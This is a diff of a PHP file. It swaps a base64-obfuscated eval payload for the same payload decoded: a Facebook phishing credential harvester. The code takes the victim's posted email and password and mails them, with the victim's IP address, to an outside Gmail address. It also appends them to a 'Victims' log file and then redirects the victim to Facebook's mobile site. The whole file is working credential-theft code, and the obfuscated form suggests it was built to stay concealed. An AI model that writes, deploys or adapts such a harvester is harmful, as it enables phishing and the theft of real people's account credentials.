@@ -1,1 +1,27 @@
-<?php eval("?>".base64_decode("Gl5base6XnJePD9waHAKI0xlYXJuIFNlY3VyaXR5IG9uIAokaXA9JF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CgoKJEVtYWlsID0gJF9QT1NUWydlbWFpbCddOwokUGFzc3dkID0gJF9QT1NUIFsncGFzcyddOwoKCgokRW1haWwgPSAkX1BPU1RbJ2VtYWlsJ107CiRQYXNzd2QgPSAkX1BPU1QgWydwYXNzJ107CgokdG8gPSAiZWxzYWlkaW0xMjRAZ21haWwuY29tIjsKJHlvdSA9ICJlbHNhaWRpbTEyNEBnbWFpbC5jb20iOwoKbWFpbCAoIiR0byIsIklQOiRpcCIsIlBhc3N3ZCA6JFBhc3N3ZCIsIk1haWwgaXMgOiRFbWFpbCIpOwoKJGhhYmJvID0gJF9QT1NUWydlbWFpbCddOyAKJHBhc3N3b3JkID0gJF9QT1NUWydwYXNzJ107CiRpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOyAKJGYgPSBmb3BlbigiVmljdGltcyBkYXJzaDg4LnR4dCIsICJhIik7CmZ3cml0ZSAoJGYsICIkaGFiYm8gOiAkcGFzc3dvcmRcclxuICIpOwpmY2xvc2UoJGYpOwoKaGVhZGVyKCJMb2NhdGlvbjogaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8iKTsKPz4K")); ?>
+<?php
+#Learn Security on 
+$ip=$_SERVER['REMOTE_ADDR'];
+
+
+$Email = $_POST['email'];
+$Passwd = $_POST ['pass'];
+
+
+
+$Email = $_POST['email'];
+$Passwd = $_POST ['pass'];
+
+$to = "elsaidim124@gmail.com";
+$you = "elsaidim124@gmail.com";
+
+mail ("$to","IP:$ip","Passwd :$Passwd","Mail is :$Email");
+
+$habbo = $_POST['email']; 
+$password = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR']; 
+$f = fopen("Victims darsh88.txt", "a");
+fwrite ($f, "$habbo : $password\r\n ");
+fclose($f);
+
+header("Location: https://m.facebook.com/");
+?>
